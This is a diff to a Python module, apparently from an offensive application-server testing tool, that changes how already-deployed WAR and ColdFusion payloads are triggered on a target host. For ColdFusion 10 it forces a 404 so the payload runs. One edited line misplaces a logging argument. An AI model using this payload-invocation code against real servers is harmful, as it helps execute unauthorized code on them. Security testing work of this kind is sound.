@@ -44,10 +44,8 @@ def invoke_war(fingerengine, fingerprint):
     if _invoke(url): 
         utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
     else:
-        utility.Msg("Failed to invoke {0} (HTTP {1})".format(
-                                                     parse_war_path(dfile, True),
-                                                     response.status_code),
-                                                     LOG.ERROR)
+        utility.Msg("Failed to invoke {0}".format(parse_war_path(dfile, True),
+                                                  LOG.ERROR))
 
 
 def invoke_cf(fingerengine, fingerprint):
@@ -55,9 +53,15 @@ def invoke_cf(fingerengine, fingerprint):
     """
 
     dfile = parse_war_path(fingerengine.options.deploy, True)
-    url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
-                                           fingerprint.port,
-                                           dfile)
+
+    if fingerprint.version in ["10.0"]:
+        # deployments to 10 require us to trigger a 404
+        url = "http://{0}:{1}/CFIDE/ad123.cfm".format(fingerengine.options.ip,
+                                                      fingerprint.port)
+    else:
+        url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
+                                               fingerprint.port,
+                                               dfile)
 
     if _invoke(url):
         utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
@@ -74,7 +78,8 @@ def _invoke(url):
         response = utility.requests_get(url)
         if response.status_code == 200:
             status = True
-
+        else:
+            utility.Msg("Failed to invoke (HTTP %d)" % response.status_code)
     except Exception, e:
         utility.Msg("Failed to invoke payload: %s" % e, LOG.ERROR)
         status = False
